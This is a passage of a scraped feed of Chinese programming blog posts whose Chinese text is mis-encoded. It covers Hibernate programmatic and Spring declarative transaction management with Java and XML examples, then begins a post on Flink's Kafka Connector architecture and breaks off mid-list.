<h4 data-id="heading-3">ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†çš„å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateTransactionExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªäº§å“</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// ä¿å­˜äº§å“</span>
        saveProduct(product);
        
        <span class="hljs-comment">// æ›´æ–°äº§å“</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        updateProduct(product);
        
        <span class="hljs-comment">// åˆ é™¤äº§å“</span>
        deleteProduct(product.getId());

        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.save(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.update(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                session.delete(product);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. å£°æ˜å¼äº‹åŠ¡ç®¡ç†</h3>
<p>å£°æ˜å¼äº‹åŠ¡ç®¡ç†åœ¨Springæ¡†æ¶ä¸­å¾ˆå¸¸è§ï¼Œé€šè¿‡æ³¨è§£æˆ–XMLé…ç½®æ¥ç®¡ç†äº‹åŠ¡ã€‚å®ƒä¸éœ€è¦æ˜¾å¼çš„äº‹åŠ¡ç®¡ç†ä»£ç ï¼Œæ›´ç®€æ´ä¸”æ˜“äºç»´æŠ¤ã€‚</p>
<h4 data-id="heading-5">Springé…ç½®</h4>
<p>åœ¨Springçš„é…ç½®æ–‡ä»¶<code>applicationContext.xml</code>ä¸­é…ç½®äº‹åŠ¡ç®¡ç†ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans"</span>
       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">"http://www.springframework.org/schema/context"</span>
       <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">"http://www.springframework.org/schema/tx"</span>
       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Hibernate SessionFactory --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.LocalSessionFactoryBean"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"dataSource"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"packagesToScan"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.example.domain"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernateProperties"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- DataSource --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driverClassName"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"jdbc:mysql://localhost:3306/your_database"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_username"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_password"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Transaction Manager --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"transactionManager"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.HibernateTransactionManager"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"sessionFactory"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Enable annotation-driven transaction management --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tx:annotation-driven</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- Service layer beans --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"productService"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.service.ProductService"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">å®ä½“ç±»å®šä¹‰</h4>
<p>ä¸ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†ä¸­çš„å®ä½“ç±»å®šä¹‰ç›¸åŒï¼Œè¿™é‡Œä¸å†é‡å¤ã€‚</p>
<h4 data-id="heading-7">æœåŠ¡å±‚å®šä¹‰</h4>
<p>åœ¨æœåŠ¡å±‚ä¸­ä½¿ç”¨<code>@Transactional</code>æ³¨è§£æ¥ç®¡ç†äº‹åŠ¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Session;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.save(product);
        System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.update(product);
        System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            session.delete(product);
            System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-8">ä½¿ç”¨æœåŠ¡å±‚</h4>
<p>åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ä½¿ç”¨æœåŠ¡å±‚æ¥è¿›è¡Œæ•°æ®åº“æ“ä½œï¼Œäº‹åŠ¡ç®¡ç†ç”±Springè‡ªåŠ¨å¤„ç†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;
<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringHibernateTransactionExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"applicationContext.xml"</span>);
        <span class="hljs-type">ProductService</span> <span class="hljs-variable">productService</span> <span class="hljs-operator">=</span> context.getBean(ProductService.class);

        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªäº§å“</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// ä¿å­˜äº§å“</span>
        productService.saveProduct(product);

        <span class="hljs-comment">// æ›´æ–°äº§å“</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        productService.updateProduct(product);

        <span class="hljs-comment">// åˆ é™¤äº§å“</span>
        productService.deleteProduct(product.getId());
    }
}
</code></pre>
<h3 data-id="heading-9">æ€»ç»“</h3>
<ol>
<li><strong>ç¨‹åºåŒ–äº‹åŠ¡ç®¡ç†</strong>ï¼šåœ¨ä»£ç ä¸­æ˜¾å¼åœ°æ§åˆ¶äº‹åŠ¡çš„å¼€å§‹ã€æäº¤å’Œå›æ»šï¼Œé€‚ç”¨äºç®€å•åº”ç”¨æˆ–éœ€è¦ç²¾ç¡®æ§åˆ¶äº‹åŠ¡è¾¹ç•Œçš„åœºæ™¯ã€‚</li>
<li><strong>å£°æ˜å¼äº‹åŠ¡ç®¡ç†</strong>ï¼šé€šè¿‡Springæ¡†æ¶çš„æ³¨è§£æˆ–XMLé…ç½®æ¥ç®¡ç†äº‹åŠ¡ï¼Œä¸éœ€è¦æ˜¾å¼çš„äº‹åŠ¡ç®¡ç†ä»£ç ï¼Œæ›´ç®€æ´ä¸”æ˜“äºç»´æŠ¤ã€‚</li>
</ol>
<p>é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†Hibernateåº”ç”¨ç¨‹åºä¸­çš„äº‹åŠ¡ï¼Œç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚å¸Œæœ›è¿™äº›è¯¦ç»†çš„è§£é‡Šå’Œä»£ç ç¤ºä¾‹èƒ½å¸®åŠ©æ‚¨æ›´å¥½åœ°ç†è§£å’Œåº”ç”¨Hibernateçš„äº‹åŠ¡ç®¡ç†æŠ€æœ¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flinkæºç é˜…è¯»ï¼šKafka Connector]]></title>    <link>https://juejin.cn/post/7597125475602317339</link>    <guid>https://juejin.cn/post/7597125475602317339</guid>    <pubDate>2026-01-20T14:05:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475602317339" data-draft-id="7597125475602300955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flinkæºç é˜…è¯»ï¼šKafka Connector"/> <meta itemprop="keywords" content="Flink,å¤§æ•°æ®"/> <meta itemprop="datePublished" content="2026-01-20T14:05:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢å‘Googleç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flinkæºç é˜…è¯»ï¼šKafka Connector
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢å‘Googleç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:05:03.000Z" title="Tue Jan 20 2026 14:05:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æˆ‘ä»¬æ¥æ¢³ç† Kafka Connector ç›¸å…³çš„æºç ã€‚</p>
<h3 data-id="heading-0">è‡ªå®šä¹‰ Source å’Œ Sink</h3>
<p>åœ¨ä»‹ç» Kafka Connector ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åœ¨ Flink ä¸­æ˜¯å¦‚ä½•æ”¯æŒè‡ªå®šä¹‰ Source å’Œ Sink çš„ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€å¼  Flink å®˜æ–¹æ–‡æ¡£æä¾›çš„å›¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57a5bc84c82248efa87969d645ce9eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=SzbKOFFgntjWtzjgc91KnxTtjkc%3D" alt="table-connector" loading="lazy"/></p>
<p>è¿™å¼ å›¾å±•ç¤ºäº† Connector çš„åŸºæœ¬ä½“ç³»ç»“æ„ï¼Œä¸‰å±‚æ¶æ„ä¹Ÿéå¸¸æ¸…æ™°ã€‚</p>
<h4 data-id="heading-1">Metadata</h4>
<p>é¦–å…ˆæ˜¯æœ€ä¸Šå±‚çš„ MetaDataï¼ŒCREATE TABLE ä¼šæ›´æ–° Catalogï¼Œç„¶åè¢«è½¬æ¢ä¸º TableAPI çš„ CatalogTableï¼ŒCatalogTable å®ä¾‹ç”¨äºè¡¨ç¤ºåŠ¨æ€è¡¨ï¼ˆSource æˆ– Sink è¡¨ï¼‰çš„å…ƒä¿¡æ¯ã€‚</p>
<h4 data-id="heading-2">Planning</h4>
<p>åœ¨è§£æå’Œä¼˜åŒ–ç¨‹åºæ—¶ï¼Œä¼šå°† CatalogTable è½¬æ¢ä¸º DynamicTableSource å’Œ DynamicTableSinkï¼Œåˆ†åˆ«ç”¨äºæŸ¥è¯¢å’Œæ’å…¥æ•°æ®ï¼Œè¿™ä¸¤ä¸ªå®ä¾‹çš„åˆ›å»ºéƒ½éœ€è¦å¯¹åº”çš„å·¥å‚ç±»ï¼Œå·¥å‚ç±»çš„å®Œæ•´è·¯å¾„éœ€è¦æ”¾åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">META-INF/services/org.apache.flink.table.factories.Factory
</code></pre>
<p>å¦‚æœæœ‰éœ€è¦çš„è¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨è§£æè¿‡ç¨‹ä¸­é…ç½®ç¼–ç å’Œè§£ç æ–¹æ³•ã€‚</p>
<p>åœ¨ Source ç«¯ï¼Œé€šè¿‡ä¸‰ä¸ªæ¥å£æ”¯æŒä¸åŒçš„æŸ¥è¯¢èƒ½åŠ›ã€‚</p>
<ul>
<li>
<p>ScanTableSourceï¼šç”¨äºæ¶ˆè´¹ changelog æµï¼Œæ‰«æçš„æ•°æ®æ”¯æŒ insertã€updataã€delete ä¸‰ç§ç±»å‹ã€‚ScanTableSource è¿˜æ”¯æŒå¾ˆå¤šå…¶ä»–çš„åŠŸèƒ½ï¼Œ éƒ½æ˜¯é€šè¿‡æ¥å£æä¾›çš„ã€‚å…·ä½“å¯ä»¥çœ‹å‚è€ƒè¿™ä¸ªè¿æ¥</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#source-abilities</span>
</code></pre>
</li>
<li>
<p>LookupTableSourceï¼šLookupTableSource ä¸ä¼šå…¨é‡è¯»å–è¡¨çš„æ•°æ®ï¼Œå®ƒåœ¨éœ€è¦æ—¶ä¼šå‘é€è¯·æ±‚ï¼Œæ‡’åŠ è½½æ•°æ®ã€‚ç›®å‰åªæ”¯æŒ insert-only å˜æ›´æ¨¡å¼ã€‚</p>
</li>
<li>
<p>VectorSearchTableSourceï¼šä½¿ç”¨ä¸€ä¸ªè¾“å…¥å‘é‡æ¥æœç´¢æ•°æ®ï¼Œå¹¶è¿”å›æœ€ç›¸ä¼¼çš„ Top-K è¡Œæ•°æ®ã€‚</p>
</li>
</ul>
<p>åœ¨ Sink ç«¯ï¼Œé€šè¿‡ DynamicTableSink æ¥å®ç°å…·ä½“çš„å†™å…¥é€»è¾‘ï¼Œè¿™é‡Œä¹Ÿæä¾›äº†ä¸€äº›ç”¨äºæ‰©å±•èƒ½åŠ›çš„æ¥å£ã€‚å…·ä½“å‚è€ƒ</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#sink-abilities</span>
</code></pre>
<h4 data-id="heading-3">Runtime</h4>
<p>é€»è¾‘è§£æå®Œæˆåï¼Œä¼šåˆ° Runtime å±‚ã€‚è¿™é‡Œå°±æ˜¯å®šä¹‰å‡ ä¸ª Providerï¼Œåœ¨ Provider ä¸­å®ç°å’Œè¿æ¥å™¨å…·ä½“çš„äº¤äº’é€»è¾‘ã€‚</p>
<h4 data-id="heading-4">å°ç»“</h4>
<p>å½“æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ Source å’Œ Sink æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ã€‚</p>
<ol>
<li>
